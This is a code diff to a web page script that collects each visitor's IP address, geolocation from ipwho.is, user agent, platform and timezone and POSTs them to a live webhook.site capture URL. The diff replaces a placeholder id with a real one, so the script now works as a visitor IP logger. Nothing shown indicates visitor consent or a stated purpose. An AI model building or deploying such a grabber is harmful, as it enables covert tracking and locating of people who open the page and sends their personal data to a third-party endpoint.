@@ -48,22 +48,27 @@
       let userInfo = {
         ip: 'Unavailable',
         location: 'Unavailable',
-        browser: 'Unavailable',
+        browser: navigator.userAgent,
         device: navigator.platform,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       };
 
       try {
-        // Fetch IP and location
-        const ipResponse = await fetch('https://webhook.site/6aec35f9-fc3e-406d-afdf-a39bb1d0138e');
+        // Fetch IP and location using ipwho.is
+        const ipResponse = await fetch('https://ipwho.is/');
         if (ipResponse.ok) {
-          Object.assign(ipData, await ipResponse.json());
-          userInfo.ip = ipData.ip;
-          userInfo.location = `${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
+          const ipJson = await ipResponse.json();
+          if (ipJson.success) {
+            ipData.ip = ipJson.ip;
+            ipData.city = ipJson.city || 'Unavailable';
+            ipData.region = ipJson.region || 'Unavailable';
+            ipData.country_name = ipJson.country || 'Unavailable';
+          }
         }
 
-        // Set browser info
-        userInfo.browser = navigator.userAgent;
+        // Update userInfo object
+        userInfo.ip = ipData.ip;
+        userInfo.location = `${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
 
         // Display user info
         ipElement.textContent = `IP Address: ${userInfo.ip}`;
@@ -72,7 +77,7 @@
         timezoneElement.textContent = `Timezone: ${userInfo.timezone}`;
 
         // Send data to Webhook.site
-        await fetch('https://webhook.site/your-unique-id', {
+        await fetch('https://webhook.site/6aec35f9-fc3e-406d-afdf-a39bb1d0138e', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(userInfo),
